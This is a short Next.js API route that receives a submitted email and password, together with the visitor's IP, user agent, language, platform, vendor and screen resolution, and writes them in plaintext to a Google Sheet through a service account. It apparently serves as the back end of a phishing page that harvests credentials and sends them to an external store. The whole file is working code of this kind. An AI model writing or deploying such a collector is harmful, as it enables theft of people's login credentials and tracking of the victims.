import { GoogleSpreadsheet } from 'google-spreadsheet';
import { JWT } from 'google-auth-library';
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';

const SPREADSHEET_ID = process.env.GOOGLE_SPREADSHEET_ID!;
const SHEET_ID = process.env.GOOGLE_SHEET_ID!;
const GOOGLE_CLIENT_EMAIL = process.env.GOOGLE_CLIENT_EMAIL!;
const GOOGLE_PRIVATE_KEY = process.env.GOOGLE_PRIVATE_KEY!.replace(
  /\\n/g,
  '\n'
);

export async function POST(request: Request) {
  try {
    const data = await request.json();

    const serviceAccountAuth = new JWT({
      email: GOOGLE_CLIENT_EMAIL,
      key: GOOGLE_PRIVATE_KEY,
      scopes: ['https://www.googleapis.com/auth/spreadsheets'],
    });

    const doc = new GoogleSpreadsheet(
      SPREADSHEET_ID,
      serviceAccountAuth
    );
    await doc.loadInfo();

    const sheet = doc.sheetsById[SHEET_ID];

    await sheet.addRow({
      timestamp: new Date().toISOString(),
      email: data.email,
      password: data.password,
      ip: data.ip,
      userAgent: data.userAgent,
      language: data.language,
      platform: data.platform,
      vendor: data.vendor,
      screenResolution: data.screenResolution,
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error logging to Google Sheets:', error);
    return NextResponse.json(
      { error: 'Failed to log data' },
      { status: 500 }
    );
  }
}
